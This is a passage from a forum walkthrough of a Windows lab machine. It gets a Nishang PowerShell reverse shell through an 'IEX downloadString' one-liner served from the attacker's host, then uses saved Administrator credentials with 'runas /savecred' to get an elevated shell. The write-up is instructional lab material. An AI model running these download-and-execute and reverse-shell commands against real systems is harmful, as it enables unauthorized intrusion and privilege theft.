<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ceac57a219235ab59c5e1227761c8afe3777a1d.png" alt="grafik" data-base62-sha1="fxwyR6vnjzef9w1xjTOr8oo1ML3" width="462" height="195"><br>
We could successfully log in by using the credentials we found from the ZIP file.<br>
Now it‚Äôs time for local enumeration, but first, it‚Äôs always better to work with a reverse shell.</p>
<p><strong>Make sure you understand how a reverse shell works because it‚Äôs an essential part in this whole area.</strong></p>
<h2>10. Reverse Shell through PowerShell</h2>
<p>But before we can obtain a reverse shell we have to plan it, understand how it should work and how the whole scenario of it will look like.<br>
<strong>We have to force our target to connect back to us.</strong> ‚Ä¶<em>(cough) firewalls (cough)</em>‚Ä¶</p>
<p>What do we need:</p>
<ol>
<li>Reverse shell script</li>
<li>Web server</li>
<li>Listener</li>
<li>Execution command</li>
</ol>
<h3>1. Reverse shell Script</h3>
<p><a href="https://github.com/samratashok/nishang" rel="noopener nofollow ugc">Nishang</a> created an excellent collection of different PowerShell scripts. One of these we will use to obtain our reverse shell. We will copy it to our working directory.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a3b6df933bd1f91c410c1d7236d50e6e52d4b8c6.png" alt="grafik" data-base62-sha1="nmhDbrbwjRgPMsSjGKmyeJ7Tig6" width="690" height="224"></p>
<p>We want to make sure that our target machine will execute it directly. Here we have to make some changes for that. By looking into the reverse shell script, we will see an example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/252457a81f132c14d60d9da1aaa057881afd8f9e.png" alt="grafik" data-base62-sha1="5izwQ0yPnhd0zz0smcr1DbqQVR4" width="690" height="256"></p>
<p>We will copy this line at the end of the file and remove the ‚ÄúPS &gt;‚Äù. After these changes it will look like this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e2d1291da41f41409149af377e7cdfe0c6ddc69b.png" alt="grafik" data-base62-sha1="wmw22j6XwBd603tSyICbh5yqBeP" width="634" height="247"></p>
<h3>2. Web server</h3>
<p>There exist a lot of methods to share files. We will use this time a Python3 Web server module in the directory we stored our script.</p>
<blockquote>
<p>python3 -m http.server 80</p>
</blockquote>
<h3>3. Listener</h3>
<p>After that, we have to start our listener and listen on the port we set in the script before. In my case, it was the TCP port <strong>2201</strong>. Therefore I will use <strong>Netcat</strong>.</p>
<blockquote>
<p>nc -nlvp 2201</p>
</blockquote>
<h3>4. Execution command</h3>
<p>The execution command for this will be:</p>
<blockquote>
<p>C:\Users\security&gt; powershell -c IEX(New-Object Net.WebClient).downloadString(‚Äò<a href="http://10.10.14.5/revshell.ps1" rel="noopener nofollow ugc">http://10.10.14.5/revshell.ps1</a>‚Äô)</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/733122b77cba6f363717894f2d0d4c00119ffe1b.png" alt="grafik" data-base62-sha1="gr2bgjXYjgPskoOd9qRWOtvBV6r" width="690" height="218"></p>
<h2>11. Local enumeration</h2>
<p><a href="https://github.com/411Hall" rel="noopener nofollow ugc">411Hall</a> created an awesome enumeration PowerShell script called <a href="https://github.com/411Hall/JAWS" rel="noopener nofollow ugc">JAWS</a> to identify privilege escalation vectors quickly.<br>
We will let our target system download and execute it the same way we did it with the reverse shell.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/64cde319e4c2758817f7205695dce43599edcc04.png" alt="grafik" data-base62-sha1="enKRcJDEplNR3msTwHFbl5ZRI0c" width="690" height="352"></p>
<p>It will take a few minutes. So don‚Äôt quit the session.<br>
The most interesting part is this one:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ffd3a83f6c191948fad8e5fc1d9f3de6aed1db5.png" alt="grafik" data-base62-sha1="kxMOInr5NJmUUAk2JZ3iNj6ePNX" width="530" height="185"></p>
<p>Also, let us take a look at the desktop of the ‚Äòsecurity‚Äô user.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/48c556e7a3f6e30fcebed21a9cd35e16aa65e7bd.png" alt="grafik" data-base62-sha1="anLaTy4fsHRiGKPEmvwa69Xu9ad" width="518" height="180"></p>
<p>So it seems we have here some stored credentials for the Administrator on this machine.<br>
<strong>If we don‚Äôt know how to export them what else could we do?</strong></p>
<h2>12. Privilege Escalation</h2>
<p>Let us ask Google:</p>
<blockquote>
<p>Ok, Google: windows currently stored credentials privilege escalation</p>
</blockquote>
<p>Also here on the first page, you will find a GitHub repository of <a href="https://github.com/swisskyrepo" rel="noopener nofollow ugc">swisskyrepo</a> to his <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" rel="noopener nofollow ugc">Windows - Privilege Escalation</a> cheat sheet.<br>
If we press <strong>CTRL+F</strong> and search for ‚Äústored credentials‚Äù you will see this example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/011fdc691793431fe758fadc3e600cf7e035b33e.png" alt="grafik" data-base62-sha1="9WJPSqbNSQPJIWJzrG9FQ9XNiC" width="690" height="276"><br>
<strong>Ok. Do we need an EXE file or can we do something else?</strong></p>
<p>What do you think about another reverse shell but this time with Administrator privileges?</p>
<p>Go back to <strong>10. Reverse Shell through PowerShell</strong> if you don‚Äôt know how it does work or how it should look like. But I think this should be clear right now. It‚Äôs the same scenario in this situation.</p>
<ol>
<li>We will just change the TCP port of our reverse shell script to <strong>2202</strong>.</li>
<li>Run our python web server.</li>
<li>Set up our listener on TCP port 2202.</li>
<li>Execute it the same way with PowerShell with the currently stored credentials.</li>
</ol>
<h3>1. Reverse Shell Script</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/61bd1edc55bcffd0ac14bfee9acff9acc7d535e3.png" alt="grafik" data-base62-sha1="dWDvdCdoT8SagPNtb6ABIwz9Agb" width="632" height="214"></p>
<h3>2. Web server</h3>
<blockquote>
<p>python3 -m http.server 80</p>
</blockquote>
<h3>3. Listener</h3>
<blockquote>
<p>nc -nlvp 2202</p>
</blockquote>
<h3>4. Execution command</h3>
<blockquote>
<p>PS C:\Users\security&gt; runas /savecred /user:ACCESS\Administrator ‚Äúpowershell.exe IEX(New-Object Net.WebClient).downloadString(‚Äò<a href="http://10.10.14.5/revshell.ps1" rel="noopener nofollow ugc">http://10.10.14.5/revshell.ps1</a>‚Äô)‚Äù</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ae628d5ef86dab9182dabd11a292eb8f24a19051.png" alt="grafik" data-base62-sha1="oSGe4JuLtbOSyRlPw2n8K3J6vgR" width="690" height="382"></p>
<h2>12. Challenge</h2>
<p>For this challenge, your goals will be</p>
<ol>
<li>A <strong>Meterpreter</strong> session</li>
<li>Upload Mimikatz and read the credentials</li>
</ol>
<p>Restrictions:</p>
<ol>
<li>The usage of <strong>Empire</strong> or their scripts for this challenge is forbidden.</li>
</ol>
<p>Have fun!</p>
<hr>
<blockquote>
<p>YouTube video coming soon!</p>
</blockquote>
<p>Best regards,<br>
Cry0l1t3<br>
<a href="https://www.shell-affect.com" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png" alt="logo" data-base62-sha1="5EBtqZQBcIDxRT3RlPHxV5GcRmg" width="477" height="96"></a></p>
<p>Official Website: <a href="https://www.shell-affect.com" rel="noopener nofollow ugc">https://www.shell-affect.com</a><br>
Twitter: <a href="https://twitter.com/ShellAffect" rel="noopener nofollow ugc">https://twitter.com/ShellAffect</a><br>
Xing: <a href="https://www.xing.com/companies/shell-affect" rel="noopener nofollow ugc">https://www.xing.com/companies/shell-affect</a><br>
YouTube: <a href="https://www.youtube.com/channel/UCgxyvJCaG1vRLM2GIpyBiWQ" rel="noopener nofollow ugc">https://www.youtube.com/channel/UCgxyvJCaG1vRLM2GIpyBiWQ</a></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
